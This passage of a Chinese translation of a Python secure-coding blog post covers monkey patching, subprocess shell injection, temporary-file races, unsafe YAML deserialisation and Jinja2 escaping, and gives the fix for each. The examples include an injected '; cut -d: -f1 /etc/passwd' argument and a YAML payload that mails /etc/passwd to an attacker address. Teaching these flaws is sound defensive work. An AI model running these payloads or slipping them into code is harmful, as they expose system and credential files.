&nbsp;&nbsp;&nbsp;NameError:&nbsp;name&nbsp;&#39;malicious&#39;&nbsp;is&nbsp;not&nbsp;defined</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">如果攻击者结合 sys.path 条目注入进行攻击，就有可能进一步破解系统。</span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">猴子补丁</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在运行时更改Python 对象属性的过程被称为猴子补丁。Python 是一种动态语言，完全支持在运行时更改程序和代码。一旦恶意模块通过某种方式进入其中，任何现有的可变对象都有可能在不知不觉中被恶意修改。考虑以下情况︰</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">&nbsp;</span></p><pre class="brush:python;toolbar:false">$&nbsp;cat&nbsp;nowrite.py
&nbsp;&nbsp;&nbsp;import&nbsp;builtins
&nbsp;&nbsp;&nbsp;def&nbsp;malicious_open(*args,&nbsp;**kwargs):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;len(args)&nbsp;&gt;&nbsp;1&nbsp;and&nbsp;args[1]&nbsp;==&nbsp;&#39;w&#39;:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;args&nbsp;=&nbsp;(&#39;/dev/null&#39;,)&nbsp;+&nbsp;args[1:]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;original_open(*args,&nbsp;**kwargs)
&nbsp;&nbsp;&nbsp;original_open,&nbsp;builtins.open&nbsp;=&nbsp;builtins.open,&nbsp;malicious_open</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">如果上面的代码被 Python 解释器执行，那么一切写入文件都不会被存储到文件系统中︰</span></p><pre class="brush:python;toolbar:false">&nbsp;&gt;&gt;&gt;&nbsp;import&nbsp;nowrite
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;open(&#39;data.txt&#39;,&nbsp;&#39;w&#39;).write(&#39;data&nbsp;to&nbsp;store&#39;)
&nbsp;&nbsp;&nbsp;5
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;open(&#39;data.txt&#39;,&nbsp;&#39;r&#39;)
&nbsp;&nbsp;&nbsp;Traceback&nbsp;(most&nbsp;recent&nbsp;call&nbsp;last):
&nbsp;&nbsp;&nbsp;...
&nbsp;&nbsp;&nbsp;FileNotFoundError:&nbsp;[Errno&nbsp;2]&nbsp;No&nbsp;such&nbsp;file&nbsp;or&nbsp;directory:&nbsp;&#39;data.txt&#39;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">攻击者可以利用 Python 垃圾回收器 (gc.get_objects()) 掌握所有现有对象，并破解任意对象。</span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><strong>在 Python 2中</strong>， 内置对象可以通过魔法 __builtins__ 模块进行访问。一个已知的手段就是利用 __builtins__ 的可变性，这可能引起巨大灾难︰</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">&nbsp;</span></p><pre class="brush:python;toolbar:false">&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;__builtins__.False,&nbsp;__builtins__.True&nbsp;=&nbsp;True,&nbsp;False
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;True
&nbsp;&nbsp;&nbsp;False
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;int(True)
&nbsp;&nbsp;&nbsp;0</pre><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">在 Python 3中</span></strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">， 对真假的赋值不起作用，所以攻击者不能操纵这种方式进行攻击。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">函数在 Python 中是一类对象，它们保持对许多函数属性的引用。尤其是通过 __code__ 属性引用可执行字节码，当然，可以对这一属性进行修改︰</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">&nbsp;</span></p><pre class="brush:python;toolbar:false">&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;import&nbsp;shutil
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;shutil.copy
&nbsp;&nbsp;&nbsp;&lt;function&nbsp;copy&nbsp;at&nbsp;0x7f30c0c66560&gt;
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;shutil.copy.__code__&nbsp;=&nbsp;(lambda&nbsp;src,&nbsp;dst:&nbsp;dst).__code__
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;shutil.copy(&#39;my_file.txt&#39;,&nbsp;&#39;/tmp&#39;)
&nbsp;&nbsp;&nbsp;&#39;/tmp&#39;
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;shutil.copy
&nbsp;&nbsp;&nbsp;&lt;function&nbsp;copy&nbsp;at&nbsp;0x7f30c0c66560&gt;
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">一旦应用上述的猴子修补程序，尽管 shutil.copy 函数看上去仍然可用，但其实它已经默默地停止工作了，这是因为没有 op lambda 函数代码为它设置。</span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Python 对象的类型是由 __class__ 属性决定的。邪恶的攻击者可能会改变现有对象的类型来“搞破坏”：</span></p><pre class="brush:python;toolbar:false">&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;class&nbsp;X(object):&nbsp;pass
&nbsp;&nbsp;&nbsp;...&nbsp;
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;class&nbsp;Y(object):&nbsp;pass
&nbsp;&nbsp;&nbsp;...&nbsp;
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;x_obj&nbsp;=&nbsp;X()
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;x_obj
&nbsp;&nbsp;&nbsp;&lt;__main__.X&nbsp;object&nbsp;at&nbsp;0x7f62dbe5e010&gt;
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;isinstance(x_obj,&nbsp;X)
&nbsp;&nbsp;&nbsp;True
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;x_obj.__class__&nbsp;=&nbsp;Y
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;x_obj
&nbsp;&nbsp;&nbsp;&lt;__main__.Y&nbsp;object&nbsp;at&nbsp;0x7f62dbe5d350&gt;
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;isinstance(x_obj,&nbsp;X)
&nbsp;&nbsp;&nbsp;False
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;isinstance(x_obj,&nbsp;Y)
&nbsp;&nbsp;&nbsp;True
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">针对恶意猴子修补唯一的解决方法就是确保导入的Python 模块是真实完整的 。</span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">通过子进程进行外壳注入</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Python也被称为是一种胶水语言，所以对于Python脚本来说，将系统管理任务委派给其他程序通过询问操作系统来执行它们是很常见的，这样的过程还可能会提供额外的参数。对于这样的任务来说，提供子进程模块会更易于使用：</span></p><pre class="brush:python;toolbar:false">&nbsp;&gt;&gt;&gt;&nbsp;from&nbsp;subprocess&nbsp;import&nbsp;call
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;unvalidated_input&nbsp;=&nbsp;&#39;/bin/true&#39;
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;call(unvalidated_input)
&nbsp;&nbsp;&nbsp;0</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">但这里面有蹊跷！为了使用 UNIX 外壳服务（如扩展命令行参数），壳关键字调用函数的参数应该变成真。然后调用函数的第一个参数作为传递，以方便系统外壳进一步进行分析和解释。一旦调用函数 （或其他子进程模块中实现的函数）获得未经验证的用户输入，底层系统资源就变得无遮无拦了。</span></p><pre class="brush:python;toolbar:false">&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;from&nbsp;subprocess&nbsp;import&nbsp;call
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;unvalidated_input&nbsp;=&nbsp;&#39;/bin/true&#39;
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;unvalidated_input&nbsp;+=&nbsp;&#39;;&nbsp;cut&nbsp;-d:&nbsp;-f1&nbsp;/etc/passwd&#39;
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;call(unvalidated_input,&nbsp;shell=True)
&nbsp;&nbsp;&nbsp;root
&nbsp;&nbsp;&nbsp;bin
&nbsp;&nbsp;&nbsp;daemon
&nbsp;&nbsp;&nbsp;adm
&nbsp;&nbsp;&nbsp;lp
&nbsp;&nbsp;&nbsp;0</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">显然更安全的做法就是将外壳关键字保持在其默认的虚假状态，并且提供一个命令向量和子进程函数参数，这样就可以不引用 UNIX 外壳执行外部命令。在第二次的调用形式中，外壳程序不会扩展其参数或是指令。</span></p><pre class="brush:python;toolbar:false">&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;from&nbsp;subprocess&nbsp;import&nbsp;call
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;call([&#39;/bin/ls&#39;,&nbsp;&#39;/tmp&#39;])</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">如果应用程序的性质决定必须使用 UNIX 外壳服务，那么保证一切子流程没有多余的外壳功能可以被恶意用户加以利用是十分重要。在较新的 Python 版本中，标准库中的 shlex.quote 函数可以应对外壳逃逸。</span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">临时文件</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">虽然只有对临时文件的不当使用才会引起编程语言故障，但是在 Python 脚本中存在惊人的相似情况，所以还是值得一提的。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这种漏洞可能会导致对文件系统访问权限的不安全利用，其中可能会涉及到中间步骤，最终导致数据机密性或完整性的安全问题。一般问题的详细描述可以在 CWE 377中找到。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">幸运的是，Python 附带的标准库中有临时文件模块，它会提供可以&quot;以最安全的方式&quot;创建临时文件名称的高级函数。不过 tempfile.mktemp 执行还是有缺陷的，因为库的向后兼容性问题仍然存在。还有一点，那就是永远不要使用 tempfile.mktemp 功能，而是在不得不使用文件的时候使用临时文件、TemporaryFile 或 tempfile.mkstemp 。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">意外引入一个缺陷的另一种可能性是使用 shutil.copyfile 函数。这里的问题是该目标文件可能是以最不安全的方式创建的。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">精通安全的开发人员可能会考虑首先将源文件复制到随机的临时文件名称，然后以最终名称重命名临时文件。虽然这可能看起来像是一个好主意，但是如果由 shutil.move 函数执行重命名就还是不安全的。问题就是，如果临时文件没有创建在最终文件存储的文件系统，那么 shutil.move 将无法以原子方式 （通过 os.rename) 移动它，只会默认将其移动到不安全的 shutil.copy。解决办法就是使用 os.rename 而不是 shutil.move os.rename，因为这注定没办法跨越文件系统边界。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">进一步的并发隐患就是 shutil.copy 无法复制所有文件元数据，这可能会导致创建的文件不受保护。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">不仅限于 Python，所有的语言中都要小心修改远程文件系统上的文件类型。数据一致性保证往往会很据文件访问序列化的不同而产生差异。举例来说，NFSv2 不承认开放系统调用的 O_EXCL 标示符，但这是创建原子文件的关键。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">不安全的反序列化</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">存在许多数据序列化方法，其中Pickle的具体目的是序列化 Python 对象。其目标是将可用的 Python 对象转储到八位字节流以供存储或传输，然后将其重建到另一个 Python 实例。重建步骤本身就存在风险，因为这可能会导致序列化的数据被篡改。Pickle的不安全性是公认的，Python 文档中也明确指出了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">作为一种流行的配置文件格式，YAML 有时候也被看作一种强大的序列化协议，能够诱骗反序列化程序执行任意代码。更危险的是 Python-PyYAML 事实上默认 YAML 执行看似无害的反序列化︰</span></p><pre class="brush:python;toolbar:false">&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;import&nbsp;yaml
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;dangerous_input&nbsp;=&nbsp;&quot;&quot;&quot;
&nbsp;&nbsp;&nbsp;...&nbsp;some_option:&nbsp;!!python/object/apply:subprocess.call
&nbsp;&nbsp;&nbsp;...&nbsp;&nbsp;&nbsp;args:&nbsp;[cat&nbsp;/etc/passwd&nbsp;|&nbsp;mail&nbsp;attacker@blackhat.com]
&nbsp;&nbsp;&nbsp;...&nbsp;&nbsp;&nbsp;kwds:&nbsp;{shell:&nbsp;true}
&nbsp;&nbsp;&nbsp;...&nbsp;&quot;&quot;&quot;
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;yaml.load(dangerous_input)
&nbsp;&nbsp;&nbsp;{&#39;some_option&#39;:&nbsp;0}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">建议的修复方法就是永远都使用 yaml.safe_load 来处理你不能信任的 YAML 序列化。尽管如此，考虑其他序列化库倾向于使用转储/加载函数名称来满足类似用途，当前的PyYAML 默认还是感觉有点挑衅意味。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">模块化引擎</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Web 应用程序的作者很久以前就开始使用Python了 ，过去十年开发出了大量的 Web 框架。很多人开始利用模板引擎生成动态 web 内容。除了 web 应用程序，模板引擎还在一些完全不同的软件中找到了自己存在的价值，比如说安塞波它自动化工具。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">从静态模板和运行变量中呈现内容时，还是存在通过运行变量进行用户控制代码注入的风险。成功安装的 web 应用程序攻击可能会导致跨站点脚本漏洞。针对服务器端模板注入攻击的通常解决办法是在进入最终文件之前清除模板变量内容，具体做法就是否认、 剥离对于给定标记或其他特定于域的语言而言任何的奇怪转义字符。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">不幸的是，模板化引擎不能保证更加严格的安全性。现在最常用的做法中没有一种默认使用转义机制，主要依靠的还是开发人员对风险的认识。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">例如现在最流行的工具之一，Jinja2所呈现的一切︰</span></p><pre class="brush:python;toolbar:false">&nbsp;&gt;&gt;&gt;&nbsp;from&nbsp;jinja2&nbsp;import&nbsp;Environment
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;template&nbsp;=&nbsp;Environment().from_string(&#39;&#39;)
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;template.render(variable=&#39;&lt;script&gt;do_evil()&lt;/script&gt;&#39;)
&nbsp;&nbsp;&nbsp;&#39;&lt;script&gt;do_evil()&lt;/script&gt;&#39;
&nbsp;&nbsp;......除非多种可能的转义机制中存在一种可以通过改变其默认设置来显现：
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;from&nbsp;jinja2&nbsp;import&nbsp;Environment
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;template&nbsp;=&nbsp;Environment(autoescape=True).from_string(&#39;&#39;)
&nbsp;&nbsp;&nbsp;&gt;&gt;&gt;&nbsp;template.render(variable=&#39;&lt;script&gt;do_evil()&lt;/script&gt;&#39;)
&nbsp;&nbsp;&nbsp;&#39;&lt;script&gt;do_evil()&lt;/script&gt;&#39;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">更复杂的问题是，在某些使用情况下，程序员不想清除所有的模板变量，而是需要保持其中一些成分不变。这就需要引入&quot;筛选器&quot;模板化引擎地址，能够让程序员选择需要清除的个体变量内容。Jinja2 还在每个模板的基础上提供了一种切换默认逃逸值的选项。</span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">如果开发人员避开了一个语言标记集合，那么代码就会变得更加不安全，可能会导致攻击者直接进入最终文件。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">结语</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">这篇博客不是为了列出Python中存在的所有潜在陷阱和缺陷，而是为了大家提高对于安全风险的认识，希望编程变得更加愉快、生活更加安全。</span></p></p>
                <hr/>
                <p style="text-align: center;">
                    <img src="http://bobao.360.cn/img/app.jpeg"/>
                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
                </p>
                                <p>本文由 安全客 翻译，转载请注明“转自安全客”，并附上链接。<br/><a class="text-more" href="https://access.redhat.com/blogs/766093/posts/2592591" target="_blank">原文链接：https://access.redhat.com/blogs/766093/posts/2592591</a></p>
                            </div>
            <div style="margin-top: 20px;background-color:#FFFFFF">
    <input type="hidden" id="detail_title" name="detail_title" value="【技术分享】关于Python漏洞挖掘那些不得不提的事儿 - 安全客 - 有思想的安全新媒体" />
    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
    <a name="mao"></a>
    <div class="reg-log mobile-hiden">
        <div class="" id="userTo">   
            <div id="to-list" class="input-text" style="">
                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
                <ul id="preadded" style="display:none">       
                </ul>
                <div id="to-auto" style="width: 200px">
                    <ul id="feed">
                    </ul>
                </div>
            </div>
        </div>
        <input type="hidden" id="source-id" value="3028" />
        <input type="hidden" id="source-type" value="learning" />
        <input type="hidden" id="post-comment-url" value="/comment/add" />
        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
            </div>
    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />

        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
    </div>


    <div class="clearfix"></div>
    <div class="comments">
        <div class="comments-head">
            <span class="title">用户评论</span>
        </div>
                <div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/6x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="0" class="response" data-bind-id="0" data-target="4241" user-name="路人甲" href="javascript:;">
                路人甲            </a>
                        <span class="comment-time">2016-09-19 12:23:08</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="4241">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_4241" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">精彩</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/9x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="2543542076" class="response" data-bind-id="2543542076" data-target="4198" user-name="Shadow Broker" href="javascript:;">
                Shadow Broker            </a>
                        <span class="comment-time">2016-09-13 18:12:06</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="2543542076" data-target="4198">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_4198" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">值得学习一波</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>
<div class="comment">
    <div class="avatar">
        <a href="javascript:;">
                                    <img src="/img/photo/9x48x48.png">
                    </a>
    </div>
    <div class="comment-main">
        <div class="comment-user">
                        <a user-id="2543542076" class="response" data-bind-id="2543542076" data-target="4197" user-name="Blackhat" href="javascript:;">
                Blackhat            </a>
                        <span class="comment-time">2016-09-13 18:11:35</span>
            <div class="comment-action">
                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="2543542076" data-target="4197">回复</a></span>&nbsp;|&nbsp;
                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_4197" data-type="comment">点赞</a></span>
            </div>
        </div>

        <p class="content">6666666666666666</p>
        <style>
    .comment-user p{font-size: 13px; margin: 0;}
</style>
    </div>
    <div>

    </div>
</div>
<div class="clearfix"></div>

        <a class="more-long comment-more" href="javascript:;" data-target="/comment/more" data-type="learning" data-source-id="3028" data-page="2">查看更多</a>
            </div>
</div>
<script>
    $(function () {
        $('.anonymous-comment').click(function () {
            $(".join").hide();
            $(".reg-log textarea").first().removeAttr("disabled").show();
            $('#use_nickname').val('1');
//            $('#trigger-nickname').attr('checked', true);
            $('#trigger-nickname').trigger('click');
        });
        //为所有复选框绑定事件
//        checkbox_on_click();
        //ajax随机获取昵称
//        randnicknameajax(0);
        //ajax检测登录状态
        comment_check_login();
    });



    function input_checkbox(flag) {
        $('input:checkbox').each(function () {
            var value = flag ? 1 : 0;
            $(this).prop('checked', flag);
            $(this).val(value);
        });
    }

//ajax随机获取昵称
    function randnicknameajax(flag) {
        $.ajax({
            type: 'POST',
            url: $('#post-nickname-url-ajax').val(),
            data: {limit: 1, flag: flag},
            dataType: "json",
            success: function (data) {
                $('#nick-name').val(data.data[0]);
                _nick_name=data.data[0];
            }
        });
    }
    $();
//ajax检测登录状态
    function comment_check_login() {
        $.ajax({
            type: 'POST',
            url: $('#post-check-login-url-ajax').val(),
            data: {},
            dataType: "json",
            success: function (data) {
                if (data.success) {
                    $('.join').hide();
                    $(".reg-log textarea").first().removeAttr("disabled").show();
                    $("#span_use_nickname").show();
                    $('#use_nickname').val('0');
                    $('#use_nickname').attr('checked', false);
                }
            }
        });
    }
</script>        </div>
    </div>
    <div class="side-bar">
        <div class="mod hot-news">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
    </div>
    <ul class="links-list">
                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
            </ul>
</div>        <!-- 友情链接 -->
        <div class="mod blog-links mobile-hide">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
        <a href="/links/index.html" class="more">更多<i></i></a>
    </div>
        <ul class="links-list">
                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
            </ul>
    </div>
        <!-- 联系我们 -->
        <div class="mod contact mobile-hide" style="text-align:center">
    <div class="head-bar clearfix">
        <h2><i></i><span>关注我们</span></h2>
    </div>
    <!-- 微信关注 -->
    <ul class="contact-way">
        <li><a>微信关注</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
    <!-- APP下载 -->
    <ul class="contact-way">
        <li><a>安全播报APP</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
</div>

    </div>
</div>

<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
<script type="text/javascript" src="/js/common.js?v=4.5"></script>
<script>$(function() {sync_count('comment');});</script>


<!-- 语法高亮 -->
<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
    </div>

        <div class="footer">
        <div class="friend-link">
            <a href="http://www.360.cn/" target="_blank">360首页</a>
            <span>|</span>
